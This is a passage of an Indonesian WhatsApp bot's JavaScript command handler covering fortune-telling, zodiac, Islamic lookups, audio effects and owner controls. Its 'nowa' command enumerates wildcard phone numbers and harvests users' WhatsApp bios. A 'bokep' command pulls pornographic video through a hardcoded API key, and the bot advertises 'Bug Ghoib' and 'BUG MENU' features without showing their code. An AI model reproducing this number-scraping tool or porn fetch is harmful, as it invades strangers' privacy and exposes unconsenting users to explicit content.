jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
/*
case 'jansensound1':
case 'jansensound2':
case 'jansensound3':
case 'jansensound4':
case 'jansensound5':
case 'jansensound6':
case 'jansensound7':
case 'jansensound8':
case 'jansensound9':
case 'jansensound10':
case 'jansensound11':
case 'jansensound12':
case 'jansensound13':
case 'jansensound14':
case 'jansensound15':
case 'jansensound16':
case 'jansensound17':
case 'jansensound18':
case 'jansensound19':
case 'jansensound20':
case 'jansensound21':
case 'jansensound22':
case 'jansensound23':
case 'jansensound24':
case 'jansensound25':
case 'jansensound26':
case 'jansensound27':
case 'jansensound28':
case 'jansensound29':
case 'jansensound30':
case 'jansensound31':
case 'jansensound32':
case 'jansensound33':
case 'jansensound34':
case 'jansensound35':
case 'jansensound36':
case 'jansensound37':
case 'jansensound38':
case 'jansensound39':
case 'jansensound40':
case 'jansensound41':
case 'jansensound42':
case 'jansensound43':
case 'jansensound44':
case 'jansensound45':
case 'jansensound46':
case 'jansensound47':
case 'jansensound48':
case 'jansensound49':
case 'jansensound50':
case 'jansensound51':
case 'jansensound52':
case 'jansensound53':
case 'jansensound54':
case 'jansensound55':
case 'jansensound56':
case 'jansensound57':
case 'jansensound58':
case 'jansensound59':
case 'jansensound60':
case 'jansensound61':
case 'jansensound62':
case 'jansensound63':
case 'jansensound64':
case 'jansensound65':
case 'jansensound66':
case 'jansensound67':
case 'jansensound68':
case 'jansensound69':
case 'jansensound70':
case 'jansensound71':
case 'jansensound72':
case 'jansensound73':
case 'jansensound74':
case 'jansensound75':
case 'jansensound76':
case 'jansensound77':
case 'jansensound78':
case 'jansensound79':
case 'jansensound80':
case 'jansensound81':
case 'jansensound82':
case 'jansensound83':
case 'jansensound84':
case 'jansensound85':
case 'jansensound86':
case 'jansensound87':
case 'jansensound88':
case 'jansensound89':
case 'jansensound90':
case 'jansensound91':
case 'jansensound92':
case 'jansensound93':
case 'jansensound94':
case 'jansensound95':
case 'jansensound96':
case 'jansensound97':
case 'jansensound98':
case 'jansensound99':
case 'jansensound100':
case 'jansensound101':
case 'jansensound102':
case 'jansensound103':
case 'jansensound104':
case 'jansensound105':
case 'jansensound106':
case 'jansensound107':
case 'jansensound108':
case 'jansensound109':
case 'jansensound110':
case 'jansensound111':
case 'jansensound112':
case 'jansensound113':
case 'jansensound114':
case 'jansensound115':
case 'jansensound116':
case 'jansensound117':
case 'jansensound118':
case 'jansensound119':
case 'jansensound120':
case 'jansensound121':
case 'jansensound122':
case 'jansensound123':
case 'jansensound124':
case 'jansensound125':
case 'jansensound126':
case 'jansensound127':
case 'jansensound128':
case 'jansensound129':
case 'jansensound130':
case 'jansensound131':
case 'jansensound132':
case 'jansensound133':
case 'jansensound134':
case 'jansensound135':
case 'jansensound136':
case 'jansensound137':
case 'jansensound138':
case 'jansensound139':
case 'jansensound140':
case 'jansensound141':
case 'jansensound142':
case 'jansensound143':
case 'jansensound144':
case 'jansensound145':
case 'jansensound146':
case 'jansensound147':
case 'jansensound148':
case 'jansensound149':
case 'jansensound150':
case 'jansensound151':
case 'jansensound152':
case 'jansensound153':
case 'jansensound154':
case 'jansensound155':
case 'jansensound156':
case 'jansensound157':
case 'jansensound158':
case 'jansensound159':
case 'jansensound160':
case 'jansensound161':
 if (isBan) throw sticBanLu(from)
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await jansen.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break*/
//=================================================//
/*case 'bcgc': case 'bcgroup': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await jansen.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/@jansenmods'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6281364399250'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
jansen.send5ButImg(i, txt, jansen.user.name, global.thumb, btn)
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/@jansenmods'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6281364399250'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
jansen.send5ButImg(yoi, txt, jansen.user.name, global.thumb, btn)
}
reply('Sukses Broadcast')
}
break*/
//=================================================//
/*
case 'cerpen':{
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
 
cerpen anak
cerpen bahasa daerah
cerpen bahasa inggrisKak
cerpen bahasa jawa
cerpen bahasa sunda
cerpen budaya
cerpen cinta
cerpen cinta islami
cerpen cinta pertama
cerpen cinta romantis
cerpen cinta sedih
cerpen cinta segitiga
cerpen cinta sejati
cerpen galau
cerpen gokil
cerpen inspiratif
cerpen jepang
cerpen kehidupan
cerpen keluarga
cerpen kisah nyata
cerpen korea
cerpen kristen
cerpen liburan
cerpen lingkungan
cerpen lucu
cerpen malaysia
cerpen mengharukan
cerpen misteri
cerpen motivasi
cerpen nasihat
cerpen nasionalisme
cerpen olahraga
cerpen patah hati
cerpen penantian
cerpen pendidikan
cerpen pengalaman pribadi
cerpen pengorbanan
cerpen penyesalan
cerpen perjuangan
cerpen perpisahan
cerpen persahabatan
cerpen petualangan
cerpen ramadhan
cerpen remaja
cerpen renungan
cerpen rindu
cerpen rohani
cerpen romantis
cerpen sastra
cerpen sedih
cerpen sejarah
cerpen slice of life
cerpen terjemahan
cerpen thriller

`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await jansen.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}
break*/
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./basejansen/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
jansen.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
jansen.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)
if (args[0] === 'pdf') {
jansen.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
} else if (args[0] === 'docx') {
jansen.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
} else if (args[0] === 'pptx') {
jansen.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
} else if (args[0] === 'xlsx') {
jansen.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
jansen.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
jansen.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
//=================================================//
case 'public': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
jansen.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
jansen.public = false
reply('Sukses Change To Self')
}
break
//=================================================//
case 'nowa': {
if (isBan) return sticBanLu(from)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await jansen.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await jansen.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'ping': case 'pong': case 'peng': {
if (isBan) throw sticBanLu(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
👻 RESPONS  ${latensi.toFixed(4)}
👻 AKTIF Selama : ${runtime(process.uptime())}
👻 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
🍁 MEMORY NODEJS 🍁
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) m.reply(stdout)
if (stderr.trim()) m.reply(stderr)
}
}
break
//=================================================//
case 'kalkulator': case 'kal': {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'bokep':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
jansen.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
//=================================================//
case 'penjara':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await jansen.groupCreate(args.join(" "), [])
let response = await jansen.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}`
reply(teks)
break
//=================================================//
case 'antilink': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini ☢')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini ☣')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'jansenghoib': case 'welcome': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await jansen.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
jansen.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
const komo = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
jansen.sendMessage(m.chat, komo)
}
}
break
case 'autovn': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoketik': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoavailable': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'cowner': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes del friends`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
namenye = await jansen.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
jansen.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
try {
pporg = await jansen.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
jansen.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await jansen.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
jansen.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//

// # BATAS # \\

//=================================================//
case 'owner': case 'crator': {
if (isBan) throw sticBanLu(from)
jansen.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
case 'infobot': {
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1},
{buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
{buttonId: `sc`, buttonText: {displayText: 'SCRIPT'}, type: 1}
]
const buttonMessage = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
[ 🏴‍☠️ Aku Adalah Bot Jansen ]
╔══╦═╦══╗─╔╦═╦╦══╗
║╔╗║║╠╗╔╝─║║║║║╔╗║
║╔╗║║║║║╔╗║║║║║╠╣║
